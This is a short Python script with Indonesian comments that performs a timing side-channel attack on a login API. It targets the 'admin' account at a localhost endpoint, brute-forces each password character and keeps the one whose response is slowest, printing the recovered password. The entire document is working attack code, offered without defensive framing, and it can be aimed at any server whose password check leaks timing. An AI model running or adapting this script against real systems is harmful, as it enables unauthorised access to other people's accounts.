import requests
import time

# Konfigurasi
url = "http://localhost:3000/api/login"
username = "admin"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
max_length = 20  # batas maksimal panjang password
threshold_ms = 300  # jika lebih dari ini, dianggap 1 huruf benar

found_password = ""

for position in range(max_length):
    print(f"\n[+] Mencari karakter ke-{position + 1}")
    max_delay = 0
    correct_char = None

    for char in charset:
        trial = found_password + char
        payload = {
            "username": username,
            "password": trial
        }

        start = time.time()
        res = requests.post(url, json=payload)
        end = time.time()

        delay_ms = (end - start) * 1000
        print(f"   » Coba: {trial.ljust(max_length)} | Delay: {delay_ms:.2f} ms")

        if delay_ms > max_delay:
            max_delay = delay_ms
            correct_char = char

    # Ambil hanya jika delay cukup signifikan
    if max_delay > threshold_ms:
        found_password += correct_char
        print(f"[✓] Karakter benar ke-{position+1}: '{correct_char}' → Total: {found_password}")
    else:
        print("[!] Tidak ada delay signifikan. Selesai.")
        break

print(f"\n✅ Password ditemukan: {found_password}")
